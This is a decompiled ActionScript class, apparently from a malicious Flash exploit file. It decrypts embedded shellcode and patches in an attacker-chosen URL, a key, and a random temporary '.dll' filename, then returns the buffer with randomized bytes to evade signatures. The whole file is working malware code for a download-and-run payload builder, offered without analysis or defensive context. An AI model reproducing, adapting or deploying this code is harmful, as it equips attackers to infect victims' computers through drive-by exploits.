﻿package 
{
    import flash.utils.ByteArray;
    import flash.utils.Endian;
    import flash.utils.*;
    import flash.system.*;

    public class Shellcodes 
    {

        public static const raw:Class = Shellcodes_raw;
        private static const urlPatternCount:int = 200;
        private static const xkeyPatternCount:int = 16;
        private static const tempfilePatternCount:int = 10;
        private static var urlPattern:ByteArray = Tools.CreateCStrBytesPattern(uint("u".charCodeAt(0)), urlPatternCount);
        private static var xkeyPattern:ByteArray = Tools.CreateCStrBytesPattern(uint("x".charCodeAt(0)), xkeyPatternCount);
        private static var tempfilePattern:ByteArray = Tools.CreateCStrBytesPattern(uint("f".charCodeAt(0)), tempfilePatternCount);

        private var x86Shellcode:ByteArray;
        private var x86UrlOffset:uint = 0xFFFFFFFF;

        public function Shellcodes(_arg_1:String, _arg_2:String)
        {
            this.x86Shellcode = DecryptShellcode(raw);
            super();
            var _local_3:ByteArray = Tools.ToCStrByteArray(_arg_1);
            var _local_4:int = _local_3.length;
            while (_local_4 < urlPatternCount)
            {
                _local_3[_local_4] = 0;
                _local_4++;
            };
            var _local_5:ByteArray = Tools.ToCStrByteArray(_arg_2);
            _local_4 = _local_5.length;
            while (_local_4 < xkeyPatternCount)
            {
                _local_5[_local_4] = 0;
                _local_4++;
            };
            var _local_6 = (Tools.GenerateRandomString(4) + ".dll");
            var _local_7:ByteArray = Tools.ToCStrByteArray(_local_6);
            _local_4 = _local_7.length;
            while (_local_4 < tempfilePatternCount)
            {
                _local_7[_local_4] = 0;
                _local_4++;
            };
            this.x86UrlOffset = Tools.ReplaceBytes(this.x86Shellcode, urlPattern, _local_3);
            Tools.ReplaceBytes(this.x86Shellcode, xkeyPattern, _local_5);
            Tools.ReplaceBytes(this.x86Shellcode, tempfilePattern, _local_7);
        }
        private static function DecryptShellcode(_arg_1:Class):ByteArray
        {
            var _local_2:ByteArray = (new (_arg_1)() as ByteArray);
            var _local_3 = _local_2;
            (_local_3[Tools.GetUncompressString()]());
            _local_2 = Tools.DecryptByteArray(_local_2);
            _local_2.position = _local_2.length;
            while ((_local_2.position % 4))
            {
                _local_2.writeByte(0);
            };
            _local_2.endian = Endian.LITTLE_ENDIAN;
            return (_local_2);
        }

        public function GetX86Shellcode(_arg_1:uint):ByteArray
        {
            var _local_2:uint;
            try
            {
                _local_2 = ((this.x86UrlOffset + ((this.x86Shellcode["length"] * _arg_1) - (this.x86UrlOffset * _arg_1))) + 3);
                this.x86Shellcode["position"] = (_local_2 + 8);
                var _local_3 = this.x86Shellcode;
                (_local_3["writeUTFBytes"](Tools.GenerateRandomString(5)));
            } catch(e:Error)
            {
            };
            this.x86Shellcode["position"] = 0;
            return (this.x86Shellcode);
        }

    }
}